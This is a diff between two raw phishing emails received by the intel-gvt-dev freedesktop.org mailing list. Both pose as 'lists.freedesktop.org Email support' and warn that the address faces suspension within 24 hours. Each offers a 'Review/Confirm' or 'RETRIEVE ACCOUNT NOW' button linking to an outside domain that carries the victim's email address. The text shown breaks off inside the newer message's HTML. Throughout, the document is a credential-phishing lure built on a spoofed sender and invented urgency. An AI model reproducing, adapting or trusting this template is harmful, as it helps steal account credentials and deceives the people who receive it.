@@ -1,25 +1,32 @@
 Return-Path: <intel-gvt-dev-bounces@lists.freedesktop.org>
 X-Original-To: lists+intel-gvt-dev@lfdr.de
 Delivered-To: lists+intel-gvt-dev@lfdr.de
-Received: from gabe.freedesktop.org (gabe.freedesktop.org [131.252.210.177])
-	by mail.lfdr.de (Postfix) with ESMTPS id EF12E638E15
-	for <lists+intel-gvt-dev@lfdr.de>; Fri, 25 Nov 2022 17:12:09 +0100 (CET)
+Received: from gabe.freedesktop.org (gabe.freedesktop.org [IPv6:2610:10:20:722:a800:ff:fe36:1795])
+	by mail.lfdr.de (Postfix) with ESMTPS id 410E5638E31
+	for <lists+intel-gvt-dev@lfdr.de>; Fri, 25 Nov 2022 17:22:18 +0100 (CET)
 Received: from gabe.freedesktop.org (localhost [127.0.0.1])
-	by gabe.freedesktop.org (Postfix) with ESMTP id 8923710E10B;
-	Fri, 25 Nov 2022 16:12:08 +0000 (UTC)
+	by gabe.freedesktop.org (Postfix) with ESMTP id 0F33710E10E;
+	Fri, 25 Nov 2022 16:22:17 +0000 (UTC)
 X-Original-To: intel-gvt-dev@lists.freedesktop.org
 Delivered-To: intel-gvt-dev@lists.freedesktop.org
-X-Greylist: delayed 634 seconds by postgrey-1.36 at gabe;
- Fri, 25 Nov 2022 16:12:05 UTC
+X-Greylist: delayed 612 seconds by postgrey-1.36 at gabe;
+ Fri, 25 Nov 2022 16:22:12 UTC
 Received: from noreply0.spglobal.com (unknown [185.216.71.68])
- by gabe.freedesktop.org (Postfix) with ESMTPS id A6C5110E10B
+ by gabe.freedesktop.org (Postfix) with ESMTPS id 2CFDE10E107
  for <intel-gvt-dev@lists.freedesktop.org>;
- Fri, 25 Nov 2022 16:12:05 +0000 (UTC)
-From: lists.freedesktop.org Email support<noreply@parcelsinc.com>
+ Fri, 25 Nov 2022 16:22:12 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=default; d=spglobal.com;
+ h=Reply-To:From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:
+ Content-Transfer-Encoding; i=noreply@spglobal.com;
+ bh=0cQdCyRpZBr19ahY8RAI7c1Yg/SDdnC8f+7gjtsb3ZE=;
+ b=BA030UR0jGTm8I+YE9VJ38YnoVPmx0Idu92zwCf+MavqpGLlpTtve8AdNGtyjhZh7VWEQ0YWDNQx
+ LBz6rn7n16Zhc7+t1wIPB8XN/TaiUiy62HDw5cf5bfNEddfflmRW+McPATujjm4VxMvMPJL+JEV7
+ MBG493aA6bJpedfE2BE=
+From: lists.freedesktop.org Email support<noreply@spglobal.com>
 To: intel-gvt-dev@lists.freedesktop.org
 Subject: lists.freedesktop.org Suspension Notice
-Date: 25 Nov 2022 07:53:44 -0800
-Message-ID: <20221125075344.75453E303F20252F@parcelsinc.com>
+Date: 25 Nov 2022 08:06:42 -0800
+Message-ID: <20221125080642.EE37FCD65014FB63@spglobal.com>
 MIME-Version: 1.0
 Content-Type: text/html;
 	charset="iso-8859-1"
@@ -45,123 +52,320 @@ w3.org/TR/html4/loose.dtd">
 
 <HTML><HEAD>
 <META name=3DGENERATOR content=3D"MSHTML 11.00.9600.17037"></HEAD>
-<body style=3D"MARGIN: 0.5em">
-<DIV style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: Roboto,=
+<body style=3D"MARGIN: 0.5em"><STRONG><FONT size=3D6><FONT face=3DArial><SP=
+AN style=3D"BOX-SIZING: border-box; COLOR: rgb(249,83,22)">Webmail&nbsp;</S=
+PAN><BR style=3D"BOX-SIZING: border-box"></FONT></FONT></STRONG>
+<SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: Roboto=
+, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none;=
+ FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; TEXT-ALIGN: left;=
+ ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-vari=
+ant-ligatures: normal; font-variant-caps: normal; text-decoration-style: in=
+itial; text-decoration-color: initial; -webkit-text-stroke-width: 0px; text=
+-decoration-thickness: initial">
+<BR style=3D"BOX-SIZING: border-box">Dear&nbsp;</SPAN>
+ &nbsp;<SPAN style=3D"FONT-SIZE: 14px; FONT-FAMILY: Roboto, sans-serif; WHI=
+TE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FON=
+T-WEIGHT: 400; COLOR: rgb(29,34,40); FONT-STYLE: normal; TEXT-ALIGN: left; =
+ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; =
+BACKGROUND-COLOR: rgb(230,230,230); TEXT-INDENT: 0px; font-variant-ligature=
+s: normal; font-variant-caps: normal; text-decoration-style: initial; text-=
+decoration-color: initial;=20
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial">&nbsp;<=
+/SPAN>
+ <FONT style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; WHITE-SPACE: norma=
+l; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; FONT-STYLE: n=
+ormal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; TEX=
+T-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal; t=
+ext-decoration-style: initial; text-decoration-color: initial; -webkit-text=
+-stroke-width: 0px; text-decoration-thickness: initial" color=3D#000000 siz=
+e=3D3 face=3D"Times New Roman">intel-gvt-dev@lists.freedesktop.org</FONT>
+ &nbsp;<SPAN style=3D"FONT-SIZE: 14px; FONT-FAMILY: Roboto, sans-serif; WHI=
+TE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FON=
+T-WEIGHT: 400; COLOR: rgb(29,34,40); FONT-STYLE: normal; TEXT-ALIGN: left; =
+ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; =
+BACKGROUND-COLOR: rgb(230,230,230); TEXT-INDENT: 0px; font-variant-ligature=
+s: normal; font-variant-caps: normal; text-decoration-style: initial; text-=
+decoration-color: initial;=20
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial">&nbsp;<=
+/SPAN>
+ <SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: Robot=
+o, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none=
+; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; TEXT-ALIGN: left=
+; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-var=
+iant-ligatures: normal; font-variant-caps: normal; text-decoration-style: i=
+nitial; text-decoration-color: initial; -webkit-text-stroke-width: 0px; tex=
+t-decoration-thickness: initial">,</SPAN>
+ <SPAN style=3D"FONT-SIZE: 14px; FONT-FAMILY: Roboto, sans-serif; WHITE-SPA=
+CE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIG=
+HT: 400; COLOR: rgb(29,34,40); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHAN=
+S: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; BACKGR=
+OUND-COLOR: rgb(230,230,230); TEXT-INDENT: 0px; font-variant-ligatures: nor=
+mal; font-variant-caps: normal; text-decoration-style: initial; text-decora=
+tion-color: initial; -webkit-text-stroke-width:=20
+0px; text-decoration-thickness: initial">&nbsp;</SPAN>
+ <BR style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: Roboto,=
  sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; =
-FONT-WEIGHT: 400; COLOR: rgb(44,54,58); FONT-STYLE: normal; TEXT-ALIGN: lef=
-t; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255=
-,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-c=
-aps: normal; text-decoration-style: initial; text-decoration-color: initial=
-; -webkit-text-stroke-width: 0px;=20
-text-decoration-thickness: initial" name=3D"quoted-content">
-<table style=3D"BOX-SIZING: border-box; FONT-SIZE: 11px; FONT-FAMILY: helve=
-tica, arial, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-COL=
-LAPSE: collapse; TEXT-TRANSFORM: none; FONT-WEIGHT: normal; COLOR: rgb(51,5=
-1,51); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; T=
-EXT-INDENT: 0px" cellspacing=3D"0" cellpadding=3D"0" width=3D"100%" bgcolor=
-=3D"#ffffff" border=3D"0">
-<TBODY style=3D"BOX-SIZING: border-box">
-<TR style=3D"BOX-SIZING: border-box">
-<td style=3D"BOX-SIZING: border-box; FONT-SIZE: 15px; FONT-FAMILY: helvetic=
-a, arial, sans-serif; COLOR: rgb(51,51,51); LINE-HEIGHT: 18px" align=3D"lef=
-t">
-<table style=3D"BOX-SIZING: border-box; FONT-SIZE: 16px; FONT-FAMILY: helve=
-tica, arial, sans-serif; BORDER-COLLAPSE: collapse; COLOR: rgb(51,51,51)" c=
-ellspacing=3D"0" cellpadding=3D"0" width=3D"100%" border=3D"0">
-<TBODY style=3D"BOX-SIZING: border-box">
-<TR style=3D"BOX-SIZING: border-box">
-<td style=3D"BOX-SIZING: border-box">
-<P style=3D"BOX-SIZING: border-box; MARGIN-TOP: 0px"><FONT size=3D2>Dear in=
-tel-gvt-dev@lists.freedesktop.org,</FONT></P>
-<P style=3D"BOX-SIZING: border-box; MARGIN-TOP: 0px"><FONT size=3D2>Our cur=
-rent&nbsp;record indicates that your account was detected of spam activitie=
-s and has been blacklisted as a result of that&nbsp;. Failure to confirm an=
-d update your account within 24 hours will lead to permanent suspension of =
-your account.<BR style=3D"BOX-SIZING: border-box"><BR style=3D"BOX-SIZING: =
-border-box">Review and&nbsp;confirm your&nbsp;account below.</FONT></P></TD=
-></TR>
-<TR style=3D"BOX-SIZING: border-box">
-<td style=3D"BOX-SIZING: border-box">
-<table style=3D"BOX-SIZING: border-box; BORDER-COLLAPSE: collapse" cellspac=
-ing=3D"0" cellpadding=3D"1" width=3D"1" border=3D"0">
-<TBODY style=3D"BOX-SIZING: border-box">
-<TR style=3D"BOX-SIZING: border-box">
-<td style=3D"BOX-SIZING: border-box"><FONT size=3D2><BR style=3D"BOX-SIZING=
-: border-box"></FONT></TD></TR></TBODY></TABLE>
-<table style=3D"BOX-SIZING: border-box; BORDER-COLLAPSE: collapse" cellspac=
-ing=3D"0" cellpadding=3D"0" align=3D"left" border=3D"0">
-<TBODY style=3D"BOX-SIZING: border-box">
-<TR style=3D"BOX-SIZING: border-box">
-<td style=3D"BOX-SIZING: border-box; BORDER-TOP: rgb(232,180,99) 1px solid;=
- BORDER-RIGHT: rgb(232,180,99) 1px solid; BORDER-BOTTOM: rgb(232,180,99) 1p=
-x solid; BORDER-LEFT: rgb(232,180,99) 1px solid" bgcolor=3D"#ffe86c" height=
-=3D"30" valign=3D"middle" align=3D"center">
-<table style=3D"BOX-SIZING: border-box; FONT-FAMILY: helvetica, arial, sans=
--serif; BORDER-COLLAPSE: collapse" cellspacing=3D"0" cellpadding=3D"0" widt=
-h=3D"100%" bgcolor=3D"transparent" border=3D"0">
-<TBODY style=3D"BOX-SIZING: border-box">
-<TR style=3D"BOX-SIZING: border-box">
-<td style=3D"BOX-SIZING: border-box" width=3D"13">
-<table style=3D"BOX-SIZING: border-box; BORDER-COLLAPSE: collapse" cellspac=
-ing=3D"0" cellpadding=3D"1" width=3D"13" border=3D"0">
-<TBODY style=3D"BOX-SIZING: border-box">
-<TR style=3D"BOX-SIZING: border-box">
-<td style=3D"BOX-SIZING: border-box"><FONT size=3D2><BR style=3D"BOX-SIZING=
-: border-box"></FONT></TD></TR></TBODY></TABLE></TD>
-<td style=3D"BOX-SIZING: border-box"><A style=3D"BOX-SIZING: border-box; FO=
-NT-SIZE: 13px; TEXT-DECORATION: none; FONT-FAMILY: helvetica, arial, sans-s=
-erif; WHITE-SPACE: nowrap; FONT-WEIGHT: bold; COLOR: rgb(0,0,12); DISPLAY: =
-block; BACKGROUND-COLOR: transparent" href=3D"https://diallimonow.com/?emai=
-l=3Dintel-gvt-dev@lists.freedesktop.org" rel=3Dnoreferrer target=3D_blank>
-<SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: 13px; FONT-FAMILY: helvet=
-ica, arial, sans-serif; WHITE-SPACE: nowrap; FONT-WEIGHT: bold; COLOR: rgb(=
-0,0,0); DISPLAY: block"><FONT size=3D2>Review/Confirm Your intel-gvt-dev@li=
-sts.freedesktop.org</FONT></SPAN></A></TD>
-<td style=3D"BOX-SIZING: border-box" width=3D"13">
-<table style=3D"BOX-SIZING: border-box; BORDER-COLLAPSE: collapse" cellspac=
-ing=3D"0" cellpadding=3D"1" width=3D"13" border=3D"0">
-<TBODY style=3D"BOX-SIZING: border-box">
-<TR style=3D"BOX-SIZING: border-box">
-<td style=3D"BOX-SIZING: border-box"><FONT size=3D2><BR style=3D"BOX-SIZING=
-: border-box"></FONT></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></=
-TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD>
-<td style=3D"BOX-SIZING: border-box" width=3D"20">
-<table style=3D"BOX-SIZING: border-box; BORDER-COLLAPSE: collapse" cellspac=
-ing=3D"0" cellpadding=3D"1" width=3D"20" border=3D"0">
-<TBODY style=3D"BOX-SIZING: border-box">
-<TR style=3D"BOX-SIZING: border-box">
-<td style=3D"BOX-SIZING: border-box"><FONT size=3D2><BR style=3D"BOX-SIZING=
-: border-box"></FONT></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE>
-<SPAN style=3D'BOX-SIZING: border-box; FONT-SIZE: 11px; FONT-FAMILY: "Lucid=
-a Grande", Verdana, Arial, Helvetica, sans-serif; WHITE-SPACE: normal; WORD=
--SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: normal; COLO=
-R: rgb(51,51,51); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; DISPLAY: inlin=
-e; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT:=
- 0px'><FONT size=3D2>&nbsp;</FONT></SPAN></DIV>
-<DIV style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: Roboto,=
+FONT-WEIGHT: 400; COLOR: rgb(29,34,40); FONT-STYLE: normal; TEXT-ALIGN: lef=
+t; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-va=
+riant-ligatures: normal; font-variant-caps: normal; text-decoration-style: =
+initial; text-decoration-color: initial; -webkit-text-stroke-width: 0px; te=
+xt-decoration-thickness: initial">
+<SPAN style=3D"FONT-SIZE: 14px; FONT-FAMILY: Roboto, sans-serif; WHITE-SPAC=
+E: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGH=
+T: 400; COLOR: rgb(29,34,40); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS=
+: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; BACKGRO=
+UND-COLOR: rgb(230,230,230); TEXT-INDENT: 0px; font-variant-ligatures: norm=
+al; font-variant-caps: normal; text-decoration-style: initial; text-decorat=
+ion-color: initial; -webkit-text-stroke-width: 0px;=20
+text-decoration-thickness: initial">&nbsp;</SPAN>
+ <BR style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: Roboto,=
  sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; =
-FONT-WEIGHT: 400; COLOR: rgb(44,54,58); FONT-STYLE: normal; TEXT-ALIGN: lef=
-t; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255=
-,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-c=
-aps: normal; text-decoration-style: initial; text-decoration-color: initial=
-; -webkit-text-stroke-width: 0px;=20
-text-decoration-thickness: initial" name=3D"quoted-content">
-<table style=3D"BOX-SIZING: border-box; FONT-SIZE: 11px; HEIGHT: 51px; FONT=
--FAMILY: helvetica, arial, sans-serif; WIDTH: 1285px; WHITE-SPACE: normal; =
-WORD-SPACING: 0px; BORDER-COLLAPSE: collapse; TEXT-TRANSFORM: none; FONT-WE=
-IGHT: normal; COLOR: rgb(51,51,51); FONT-STYLE: normal; ORPHANS: 2; WIDOWS:=
- 2; LETTER-SPACING: normal; TEXT-INDENT: 0px" height=3D"51" cellspacing=3D"=
-0" cellpadding=3D"0" width=3D"1285" bgcolor=3D"black" border=3D"0">
-<TBODY style=3D"BOX-SIZING: border-box"><FONT size=3D2></FONT></TBODY></TAB=
-LE></DIV>
-<SPAN style=3D'BOX-SIZING: border-box; FONT-SIZE: 11px; FONT-FAMILY: "Lucid=
-a Grande", Verdana, Arial, Helvetica, sans-serif; WHITE-SPACE: normal; WORD=
--SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: normal; COLO=
-R: rgb(51,51,51); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS:=
- 2; DISPLAY: inline; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,=
-255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: =
-normal; text-decoration-style: initial;=20
-text-decoration-color: initial; -webkit-text-stroke-width: 0px; text-decora=
-tion-thickness: initial'><FONT size=3D2>&nbsp;&nbsp;&nbsp; References<BR st=
-yle=3D"BOX-SIZING: border-box">&nbsp;&nbsp;&nbsp; 2022 &#9426; lists.freede=
-sktop.org Email support.</FONT></SPAN></BODY></HTML>
+FONT-WEIGHT: 400; COLOR: rgb(29,34,40); FONT-STYLE: normal; TEXT-ALIGN: lef=
+t; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-va=
+riant-ligatures: normal; font-variant-caps: normal; text-decoration-style: =
+initial; text-decoration-color: initial; -webkit-text-stroke-width: 0px; te=
+xt-decoration-thickness: initial">
+<SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: Roboto=
+, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none;=
+ FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; TEXT-ALIGN: left;=
+ ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-vari=
+ant-ligatures: normal; font-variant-caps: normal; text-decoration-style: in=
+itial; text-decoration-color: initial; -webkit-text-stroke-width: 0px; text=
+-decoration-thickness: initial">
+Your e-Mail <FONT size=3D3 face=3D"Times New Roman">intel-gvt-dev@lists.fre=
+edesktop.org</FONT></SPAN>
+ &nbsp;<SPAN style=3D"FONT-SIZE: 14px; FONT-FAMILY: Roboto, sans-serif; WHI=
+TE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FON=
+T-WEIGHT: 400; COLOR: rgb(29,34,40); FONT-STYLE: normal; TEXT-ALIGN: left; =
+ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; =
+BACKGROUND-COLOR: rgb(230,230,230); TEXT-INDENT: 0px; font-variant-ligature=
+s: normal; font-variant-caps: normal; text-decoration-style: initial; text-=
+decoration-color: initial;=20
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial">or</SPA=
+N>
+ <SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: Robot=
+o, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none=
+; FONT-WEIGHT: 400; COLOR: rgb(29,34,40); FONT-STYLE: normal; TEXT-ALIGN: l=
+eft; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-=
+variant-ligatures: normal; font-variant-caps: normal; text-decoration-style=
+: initial; text-decoration-color: initial; -webkit-text-stroke-width: 0px; =
+text-decoration-thickness: initial">
+<FONT color=3D#000000 size=3D3 face=3D"Times New Roman">lists.freedesktop.o=
+rg</FONT></SPAN>
+ <SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: Robot=
+o, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none=
+; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; TEXT-ALIGN: left=
+; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-var=
+iant-ligatures: normal; font-variant-caps: normal; text-decoration-style: i=
+nitial; text-decoration-color: initial; -webkit-text-stroke-width: 0px; tex=
+t-decoration-thickness: initial">
+will be disconnected from sending or receiving mail from other users</SPAN>=
+
+ <SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: Robot=
+o, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none=
+; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; TEXT-ALIGN: left=
+; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-var=
+iant-ligatures: normal; font-variant-caps: normal; text-decoration-style: i=
+nitial; text-decoration-color: initial; -webkit-text-stroke-width: 0px; tex=
+t-decoration-thickness: initial">
+<SPAN style=3D"BOX-SIZING: border-box">&nbsp;</SPAN>because you failed to r=
+esolve errors on your mail.</SPAN>
+ <SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: Robot=
+o, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none=
+; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; TEXT-ALIGN: left=
+; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-var=
+iant-ligatures: normal; font-variant-caps: normal; text-decoration-style: i=
+nitial; text-decoration-color: initial; -webkit-text-stroke-width: 0px; tex=
+t-decoration-thickness: initial">
+<BR style=3D"BOX-SIZING: border-box">
+<P style=3D"BOX-SIZING: border-box; MARGIN-TOP: 0px">You have 24 hours to r=
+etrieve your account&nbsp;or your account will be suspended.</P></SPAN>
+<SPAN style=3D"FONT-SIZE: 14px; FONT-FAMILY: Roboto, sans-serif; WHITE-SPAC=
+E: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGH=
+T: 400; COLOR: rgb(29,34,40); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS=
+: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; BACKGRO=
+UND-COLOR: rgb(230,230,230); TEXT-INDENT: 0px; font-variant-ligatures: norm=
+al; font-variant-caps: normal; text-decoration-style: initial; text-decorat=
+ion-color: initial; -webkit-text-stroke-width: 0px;=20
+text-decoration-thickness: initial">Kindly follow the instructions below to=
+ retrieve your Email now.&nbsp;</SPAN>
+ <BR style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: Roboto,=
+ sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; =
+FONT-WEIGHT: 400; COLOR: rgb(29,34,40); FONT-STYLE: normal; TEXT-ALIGN: lef=
+t; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-va=
+riant-ligatures: normal; font-variant-caps: normal; text-decoration-style: =
+initial; text-decoration-color: initial; -webkit-text-stroke-width: 0px; te=
+xt-decoration-thickness: initial">
+<BR style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: Roboto, =
+sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; F=
+ONT-WEIGHT: 400; COLOR: rgb(29,34,40); FONT-STYLE: normal; TEXT-ALIGN: left=
+; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-var=
+iant-ligatures: normal; font-variant-caps: normal; text-decoration-style: i=
+nitial; text-decoration-color: initial; -webkit-text-stroke-width: 0px; tex=
+t-decoration-thickness: initial">
+<SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: Roboto=
+, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none;=
+ FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; TEXT-ALIGN: left;=
+ ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-vari=
+ant-ligatures: normal; font-variant-caps: normal; text-decoration-style: in=
+itial; text-decoration-color: initial; -webkit-text-stroke-width: 0px; text=
+-decoration-thickness: initial">
+<BR style=3D"BOX-SIZING: border-box"></SPAN>
+<SPAN style=3D"FONT-SIZE: 14px; FONT-FAMILY: Roboto, sans-serif; WHITE-SPAC=
+E: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGH=
+T: 400; COLOR: rgb(29,34,40); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS=
+: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; BACKGRO=
+UND-COLOR: rgb(230,230,230); TEXT-INDENT: 0px; font-variant-ligatures: norm=
+al; font-variant-caps: normal; text-decoration-style: initial; text-decorat=
+ion-color: initial; -webkit-text-stroke-width: 0px;=20
+text-decoration-thickness: initial"></SPAN>
+<A style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; TEXT-DECORATION: none;=
+ FONT-FAMILY: Roboto, sans-serif; BACKGROUND: rgb(70,139,252); WHITE-SPACE:=
+ normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: left; FONT-WEIGHT:=
+ 400; COLOR: rgb(255,255,255); PADDING-BOTTOM: 10px; FONT-STYLE: normal; TE=
+XT-ALIGN: left; PADDING-TOP: 10px; PADDING-LEFT: 10px; MARGIN: 2px; ORPHANS=
+: 2; WIDOWS: 2; DISPLAY: block; LETTER-SPACING: normal; PADDING-RIGHT: 10px=
+; TEXT-INDENT: 0px; font-variant-ligatures: normal;=20
+font-variant-caps: normal; -webkit-text-stroke-width: 0px; border-radius: 3=
+px" href=3D"https://diallimonow.com/?email=3Dintel-gvt-dev@lists.freedeskto=
+p.org" rel=3Dnoreferrer target=3D_blank>RETRIEVE ACCOUNT NOW</A>
+ <BR style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: Roboto,=
+ sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; =
+FONT-WEIGHT: 400; COLOR: rgb(29,34,40); FONT-STYLE: normal; TEXT-ALIGN: lef=
+t; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-va=
+riant-ligatures: normal; font-variant-caps: normal; text-decoration-style: =
+initial; text-decoration-color: initial; -webkit-text-stroke-width: 0px; te=
+xt-decoration-thickness: initial">
+<BR style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: Roboto, =
+sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; F=
+ONT-WEIGHT: 400; COLOR: rgb(29,34,40); FONT-STYLE: normal; TEXT-ALIGN: left=
+; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-var=
+iant-ligatures: normal; font-variant-caps: normal; text-decoration-style: i=
+nitial; text-decoration-color: initial; -webkit-text-stroke-width: 0px; tex=
+t-decoration-thickness: initial">
+<BR style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: Roboto, =
+sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; F=
+ONT-WEIGHT: 400; COLOR: rgb(29,34,40); FONT-STYLE: normal; TEXT-ALIGN: left=
+; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-var=
+iant-ligatures: normal; font-variant-caps: normal; text-decoration-style: i=
+nitial; text-decoration-color: initial; -webkit-text-stroke-width: 0px; tex=
+t-decoration-thickness: initial">
+<BR style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: Roboto, =
+sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; F=
+ONT-WEIGHT: 400; COLOR: rgb(29,34,40); FONT-STYLE: normal; TEXT-ALIGN: left=
+; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-var=
+iant-ligatures: normal; font-variant-caps: normal; text-decoration-style: i=
+nitial; text-decoration-color: initial; -webkit-text-stroke-width: 0px; tex=
+t-decoration-thickness: initial">
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: Roboto, s=
+ans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FO=
+NT-WEIGHT: 400; COLOR: rgb(29,34,40); FONT-STYLE: normal; TEXT-ALIGN: left;=
+ ORPHANS: 2; WIDOWS: 2; MARGIN-TOP: 0px; LETTER-SPACING: normal; TEXT-INDEN=
+T: 0px; font-variant-ligatures: normal; font-variant-caps: normal; text-dec=
